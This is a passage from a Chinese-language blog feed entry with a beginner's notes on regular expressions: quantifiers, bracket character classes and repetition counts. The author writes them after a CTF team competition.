title="通配符"></a>通配符</h3><p>通配符我们熟知的就是星号(*)和问号(?)，一般情况下它们分别代表任意多个字符或者是任意一个字符，在正则表达式中存在三种类似的符号，并且不能匹配任意字符，只能代表前面一个字符的数量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+：匹配一个或多个字符</span><br><span class="line">?：匹配一个或零个字符</span><br><span class="line">*：匹配零个或多个字符</span><br></pre></td></tr></table></figure><p>例如</p><p>‘a+’可以匹配’a’,’aa’,’aaa’,’aaaa’……等字符串。</p><p>‘a?’可以匹配’a’或者空串</p><p>‘a*’则可以匹配第一种情况和第二种情况的并集。</p><h3 id="匹配任意字符"><a href="#匹配任意字符" class="headerlink" title="匹配任意字符"></a>匹配任意字符</h3><p>[]方括号用于匹配单个字符。</p><p>例如</p><p>[abcde]可以匹配a,b,c,d,e中的任意一个字符。</p><p>如果加上^则代表匹配除了列表以外的所有字符。</p><p>例如</p><p>[^a]表示匹配所有非’a’的字符。</p><h3 id="匹配次数限定"><a href="#匹配次数限定" class="headerlink" title="匹配次数限定"></a>匹配次数限定</h3><p>{}用于限定匹配次数</p><p>例如：</p><p>[ab]{3}表示[ab]匹配三次，[ab]{3,}表示至少匹配三次。</p><p>就先学这么多吧，后续再学就再加。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近在和战队一起的比赛中又出现了诸多想要学习的知识点，那就是re和QRcode，今天先学一下这个正则吧。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="re" scheme="http://example.com/categories/ctf/re/"/>
    
    
  </entry>
  
</feed>
